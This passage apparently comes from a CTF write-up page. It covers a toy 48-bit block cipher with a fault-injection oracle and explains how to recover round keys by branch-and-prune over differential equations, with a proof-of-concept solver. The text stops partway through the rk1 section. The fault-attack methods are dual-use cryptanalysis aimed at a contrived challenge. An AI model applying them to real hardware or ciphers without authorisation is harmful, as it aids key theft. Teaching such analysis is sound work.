⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⢁⠐⢀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⣠⡐⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⣴⣾⣿⣿⣿⣶⣶⣤⣴⣶⣾⣿⣯⣈⣐⣀⠀⠐⠀⠐⠀⠠⠄⠬⠀⠀⠀⠂⣀⡠⠴⢺⣿⣿⣿⣶⣶⣶⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⠀⠀⠀⠀⢀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣠⣤⣴⣶⣶⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠠⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡿⣉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⡴⠃⡜⢢⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⡿⢐⡷⡘⢤⠂⡔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠃⣾⣽⡑⢎⡱⢌⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀
⠀⠀⠀⠀⠀⠀⣾⠃⡌⠷⢣⡙⠦⣑⡺⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠟⡛⢛⣯⠀⠀
⠀⠀⠀⠀⠀⠸⣿⠰⠾⣍⣦⢙⢢⠱⢀⠂⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⢹⠛⠛⠛⣉⢉⠡⡂⡔⢠⠎⡔⢡⠚⡌⢆⣹⠀⠀
⠀⠀⠀⠀⢀⠀⠐⠛⠒⠒⠮⣍⡉⠓⠒⡒⠒⠒⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣾⡎⠜⣡⠒⡌⢒⡡⠜⠢⡜⣠⠃⠞⣈⠖⣸⡀⠀
⠀⠀⢀⣤⠞⡋⢍⠩⢍⠳⢦⣀⠉⠉⠉⠀⢀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣌⡱⢢⠍⡔⢣⢌⡱⢃⠦⢡⠎⡱⢌⡸⢹⡅⠀
⢀⠀⣾⢡⡦⠵⠞⠒⠋⢹⡇⢼⡔⢆⣤⣤⣸⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢾⡧⡘⢥⠚⣌⢣⢊⠴⡉⡜⠢⠜⡡⢆⠱⣹⡆⠀
⢨⢸⡧⠹⢶⠒⠒⠒⡂⡆⢿⣀⠒⠌⠩⢹⡟⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡼⣇⠝⣢⠙⡤⢃⠞⡰⢱⡈⢧⠩⢔⢊⡱⢸⡇⠀
⠀⠈⣿⣁⠻⡇⢉⡐⠠⢷⢸⣶⡀⢈⣰⠟⠁⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡇⡚⢤⢋⡴⣉⠎⡥⢃⡜⠤⠓⣌⠒⠬⡱⡇⠀
⠀⠀⠘⠿⡾⠿⠰⠶⠳⠛⠂⠁⠉⠉⠀⠀⠀⠀⠘⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠉⠻⠙⠲⠓⠲⠬⢞⣴⣃⡜⢌⡃⠦⡙⢢⠅⡧⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠨⠗⠲⠂⠤⢤⣭⣉⣉⡙⠓⠓⠾⡟⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢠⣤⢖⣲⡒⣖⠲⣤⣤⡀⠙⠦⠭⠷⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣾⡿⠻⣼⠗⢳⣬⡑⢆⠲⡙⢦⡄⠀⠀⠀⠂⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠀⢸⣿⢡⡿⠋⠀⠀⡩⢷⣮⡱⣉⠦⡙⣦⢠⡀⠀⢩⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠸⣿⡞⡱⢠⡴⠊⠀⠀⠙⠿⣶⣥⠓⣼⡆⢇⡰⣱⡧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠈⠙⠉⠁⠀⡄⠀⠀⠀⠀⢈⣽⠏⣼⢓⡎⣑⣿⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠇⠀⠀⠧⠤⠄⠀⣸⡟⢣⢭⠟⠰⢡⡟⠉⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣵⣿⣌⡷⣋⡴⠁⠊⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠉⠀⠀⠀⠀⠀⠀⠀⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠟⠋⠉⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡧⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠀⢸⣁⠀⡀⠀⠀⠀⠀⡄⠠⢿⣿⣿⡷⢡⣿⠿⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣮⣄⢃⠐⡈⠐⠈⢁⣌⣭⡞⠀⡹⠁⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⡏⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢯⣿⣲⣧⣿⠿⠛⠁⠀⢨⡇⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⡏⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⢸⣧⡔⢠⠀⡀⢀⠀⡄⠒⢄⠻⡿⣿⠏⠀⢀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠄⠀⠹⣿⣧⣜⡐⢂⠂⡄⢉⢠⣰⣴⠏⠀⠀⢬⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠚⠿⠯⠾⠾⠮⠗⠋⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
============================================================================
                                R O B L O X 
============================================================================
Find the key to get the flag!"""

SZ = 48
BLKSZ = SZ * 3 // 8
WORD = 2**SZ - 1
rol = lambda x, r: ((x << r) | (x >> (SZ - r))) & WORD
ror = lambda x, r: ((x >> r) | (x << (SZ - r))) & WORD

NROUNDS = SZ // 4
DELTA = [0x123456789a, 0x00deadbeef, 0x4141414141]

KEY = os.urandom(BLKSZ)

def key_schedule_128(key: bytes) -> List[List[int]]:
    T = [int.from_bytes(key[i * (SZ // 8) : (i + 1) * (SZ // 8)], "little") for i in range(3)]
    rks: List[List[int]] = []
    for i in range(NROUNDS):
        t0 = rol(DELTA[i % 3], i & (SZ - 1))
        t1 = rol(DELTA[i % 3], (i + 1) & (SZ - 1))
        t2 = rol(DELTA[i % 3], (i + 2) & (SZ - 1))
        T[0] = rol((T[0] + t0) & WORD, 2)
        T[1] = rol((T[1] + t1) & WORD, 3)
        T[2] = rol((T[2] + t2) & WORD, 5)
        rks.append([T[0], T[1], T[2], T[1]])
    return rks

def round(state: List[int], rk: List[int]) -> None:
    x0, x1, x2 = state
    state[0] = rol(((x0 ^ rk[0]) + (x1 ^ rk[1])) & WORD, 13)
    state[1] = ror(((x1 ^ rk[2]) - (x2 ^ rk[3])) & WORD, 11)
    state[2] = x0

def encrypt(pt: bytes, key: bytes) -> bytes:
    rk = key_schedule_128(key)
    state = [int.from_bytes(pt[i:i + SZ // 8], "little") for i in range(0, BLKSZ, SZ // 8)]
    for r in rk:
        round(state, r)
    return b"".join(int(w).to_bytes(SZ // 8, "little") for w in state)

def encrypt_fault(pt: bytes, key: bytes, fault_round: int, word_idx: int) -> bytes:
    assert 0 <= fault_round < NROUNDS
    assert 0 <= word_idx < 3
    fault = int.from_bytes(os.urandom(SZ // 8), "little")
    rk = key_schedule_128(key)
    state = [int.from_bytes(pt[i:i + SZ // 8], "little") for i in range(0, BLKSZ, SZ // 8)]
    for i, r in enumerate(rk):
        if i == fault_round:
            state[word_idx] = (state[word_idx] + fault) & WORD
        round(state, r)
    return b"".join(int(w).to_bytes(SZ // 8, "little") for w in state)

if __name__ == "__main__":
    print(banner)
    
    plaintext = os.urandom(BLKSZ)
    ciphertext = encrypt(plaintext, KEY)
    print("Sample Plaintext-Ciphertext Pair:")
    print((plaintext.hex(), ciphertext.hex()))

    for _ in range(12):
        print(f"============================================================================\\nInput {_+1}/12")
        match int(input("Enter Option (Faultless = 0, Fault = 1)\\n>> ")):
            case 0:
                pt = bytes.fromhex(input("Enter plaintext\\n>> "))[:BLKSZ]
                ct = encrypt(pt, KEY)
                print(">>", ct.hex())
            case 1:
                pt = bytes.fromhex(input("Enter plaintext\\n>> "))[:BLKSZ]
                fault_round, word_idx = list(map(int, input("Enter fault_round, word_idx\\n>> ").split()))
                ct = encrypt_fault(pt, KEY, fault_round, word_idx)
                print(">>", ct.hex())
            case _:
                pass

    print("Enter key:")
    if KEY == bytes.fromhex(input(">> "))[:BLKSZ]:
        print(FLAG)`}]}></CodeBlock>
                <br></br>
                <p>The challenge is basically a custom block cipher with 12 rounds, and each round consists of some nonlinear operation referencing the round keys. We are given one sample plaintext-ciphertext pair. We can also inject random faults in any part of the state during encryption, before one particular round (that we can choose) takes place. Our goal is to find the key of the block cipher.</p>
                <br></br>
                <h3>Finding the key</h3>
                <p>Let's take a look at the key scheduling algorithm.</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'chall.py','language':'python','startingLineNumber':84,'code':`def key_schedule_128(key: bytes) -> List[List[int]]:
    T = [int.from_bytes(key[i * (SZ // 8) : (i + 1) * (SZ // 8)], "little") for i in range(3)]
    rks: List[List[int]] = []
    for i in range(NROUNDS):
        t0 = rol(DELTA[i % 3], i & (SZ - 1))
        t1 = rol(DELTA[i % 3], (i + 1) & (SZ - 1))
        t2 = rol(DELTA[i % 3], (i + 2) & (SZ - 1))
        T[0] = rol((T[0] + t0) & WORD, 2)
        T[1] = rol((T[1] + t1) & WORD, 3)
        T[2] = rol((T[2] + t2) & WORD, 5)
        rks.append([T[0], T[1], T[2], T[1]])
    return rks`}]}></CodeBlock>
                <br></br>
                <p>We can make 3 observations.</p>
                <ol style={{paddingLeft:'2vw'}}>
                    <li>For every round, the 1st round key is the same as the 3rd round key (0-indexed)</li>
                    <li>The key scheduling algorithm is entirely reversible</li>
                    <li>Each round key is scheduled independently of the others i.e. recovering the first round key in any particular round grants you the first round key for every round, and so on</li>
                </ol>
                <p>In this writeup, for convenience, I will be referring to the nth round key as rkn (0-indexed). This is regardless of which round the round key is in.</p>
                <br></br>
                <h3>Recovering rk0</h3>
                <p>Let's see what encryption in the block cipher does.</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'chall.py','language':'python','startingLineNumber':97,'code':`def round(state: List[int], rk: List[int]) -> None:
    x0, x1, x2 = state
    state[0] = rol(((x0 ^ rk[0]) + (x1 ^ rk[1])) & WORD, 13)
    state[1] = ror(((x1 ^ rk[2]) - (x2 ^ rk[3])) & WORD, 11)
    state[2] = x0

def encrypt(pt: bytes, key: bytes) -> bytes:
    rk = key_schedule_128(key)
    state = [int.from_bytes(pt[i:i + SZ // 8], "little") for i in range(0, BLKSZ, SZ // 8)]
    for r in rk:
        round(state, r)
    return b"".join(int(w).to_bytes(SZ // 8, "little") for w in state)

def encrypt_fault(pt: bytes, key: bytes, fault_round: int, word_idx: int) -> bytes:
    assert 0 <= fault_round < NROUNDS
    assert 0 <= word_idx < 3
    fault = int.from_bytes(os.urandom(SZ // 8), "little")
    rk = key_schedule_128(key)
    state = [int.from_bytes(pt[i:i + SZ // 8], "little") for i in range(0, BLKSZ, SZ // 8)]
    for i, r in enumerate(rk):
        if i == fault_round:
            state[word_idx] = (state[word_idx] + fault) & WORD
        round(state, r)
    return b"".join(int(w).to_bytes(SZ // 8, "little") for w in state)`}]}></CodeBlock>
                <br></br>
                <p>Before I proceed, there are two things of note:</p>
                <ol style={{paddingLeft:'2vw'}}>
                    <li><code className='code'>rol</code> and <code className='code'>ror</code>, which are used in encryption rounds, are reversible. So, when we are doing arithmetic on state values, it is assumed that the inverse of <code className='code'>rol</code> or <code className='code'>ror</code> (whichever is called on the state) is already carried out.</li>
                    <li>At the end of almost every operation, there is an <code className='code'>& WORD</code>. Since WORD in binary is entirely 1s, the & can be treated as a modulus (mod WORD+1). Hence, it is implicit that whenever there is an <code className='code'>& WORD</code>, we are working modulo WORD+1.</li>
                </ol>
                <br></br>
                <p>We notice that the ciphertext is just the raw state after 12 rounds. This means that we have <code className='code'>x0</code> after the second last round, as well as <code className='code'>x0</code> and <code className='code'>x1</code> after the last round.</p>
                <br></br>
                <p>With that in mind, we can fault inject <code className='code'>x0</code> right before the last round to get multiple different values of <InlineMath math="(x_0\oplus rk_0)+(x_1\oplus rk_1)"/>. Since only <code className='code'>x0</code> changes, we can subtract two such values in order to get <InlineMath math="(x_0\oplus rk_0)-(x_0'\oplus rk_0)"/>. This is an equation with only one unknown, that being rk0.</p>
                <br></br>
                <p>But how do we solve this? This does not immediately appear to be solvable as there are both xor and subtraction operations. The author's solution uses Z3, which works, but it is basically a black box, which does not help with understanding. With that being said, I would opt to use Z3 during a CTF as it is much quicker to code.</p>
                <br></br>
                <p>Well, we can use branch-and-prune to solve this. Let's first look at a simpler equation, <InlineMath math="a+b=5"/> Let's only look at the LSB. Evidently, if the LSB of a and b are both 0, the equation is not valid, as the LSB of 5 is 1. Once we know the LSB, we can proceed onto the second least significant bit, and taking into account the carry from the addition of the 2 LSBs, we notice that this "phenomenon" carries over as well. This means that we can recover a and b, bit by bit. However, we notice that there are multiple solutions for a and b. So, we branch out our brute force using recursion and prune the branches where there is no valid solution, hence the name, branch-and-prune. In this equation, this "phenomenon" is not that useful (after all, one can just...add a and b together). However, when we add an xor into the mix, it is much more useful.</p>
                <br></br>
                <p>Let's look at a different equation now: <InlineMath math="a-b=5"/>. Since we are working modulo WORD+1, the binary representation of <InlineMath math="-b"/> is the same as that of <InlineMath math="b"/>, but all the bits are flipped and 1 is added. This is a property for all negative numbers modulo some power of 2 (recall that <InlineMath math="WORD=2^{48}-1"/>).</p>
                <p>In essence, what this tells us is that we can still branch and prune on equations with subtractions, as each bit is only affected by the less significant bits (which is not a problem as we are working from LSB to MSB and not the other way around). Additionally, the modulus does not affect the branch and prune as it is a power of two, and thus only removes the bits that overflow past 48 bits.</p>
                <br></br>
                <p>Now, let's look at the original equation: <InlineMath math="(x_0\oplus rk_0)-(x_0'\oplus rk_0)"/>. Say we guess the LSB of rk0. This influences the LSB of the output. If the LSB is wrong here, we know that the solution is the other bit. However, there are some instances in which both bits are valid. Hence, we branch, and if we later find out that there are no valid solutions, we prune the branch. We keep branching at every bit index until we find the solution.</p>
                <br></br>
                <p>There is one small problem though. There are not one, not two, but an astronomically large number of solutions to this equation. During testing, I found equations with up to <InlineMath math="2^{25}"/> solutions. Not only does this take forever to even solve (as there are many valid branches), there is no way we are able to enumerate through all solutions (remember, we haven't even solved for rk1 and rk2 yet).</p>
                <br></br>
                <p>Thankfully, this can be fixed by just adding more equations into the mix, and validating all of them while pruning. In order to use the same number of queries for all round keys, I used 5 equations (one from the initial plaintext-ciphertext pair and 4 fault injections with the same plaintext). This reduces the number of valid solutions to 64 or less (though anomalies like 512 or 1024 can occasionally pop out), which we are able to solve for nearly instantly.</p>
                <br></br>
                <p>With all this being said, Z3 is extremely strong at branch-and-prune, which is why it can solve this equation.</p>
                <br></br>
                <p>Here is a proof-of-concept (without Z3) that I coded out:</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={true} data={[{'name':'poc.py','language':'python','startingLineNumber':1,'code':`import random
                
m = 2**48 - 1

def solve0(info,curr=''):
    if len(curr) == 48:
        global outs
        outs.add(int(curr,2))
        return

    for i in range(2):
        test = str(i)+curr
        ttest = int(test,2)
        for itm in info:
            a,b,hint = itm
            out = bin((a^ttest)-(b^ttest) & m)[2:].zfill(48)
            if out[-len(test):] != bin(hint)[2:].zfill(48)[-len(test):]:
                break
        else:
            solve0(info,test)

t = random.getrandbits(48)
nums = []
for _ in range(5):
    nums.append(random.getrandbits(48))

info = []
for i in range(4):
    a = nums[i]
    b = nums[(i+1)]
    hint = ((a^t)-(b^t)) & m
    info.append((a,b,hint))

outs = set()
solve0(info)
print(len(outs))
assert t in outs`}]}></CodeBlock>
                <br></br>
                <h3>Recovering rk1</h3>
                <p>This round key is by far the hardest to recover, involving an idea that I had never seen before.</p>
                <p>For convenience, I will show the code for the encryption again.</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'chall.py','language':'python','startingLineNumber':97,'code':`def round(state: List[int], rk: List[int]) -> None:
    x0, x1, x2 = state
    state[0] = rol(((x0 ^ rk[0]) + (x1 ^ rk[1])) & WORD, 13)
    state[1] = ror(((x1 ^ rk[2]) - (x2 ^ rk[3])) & WORD, 11)
    state[2] = x0

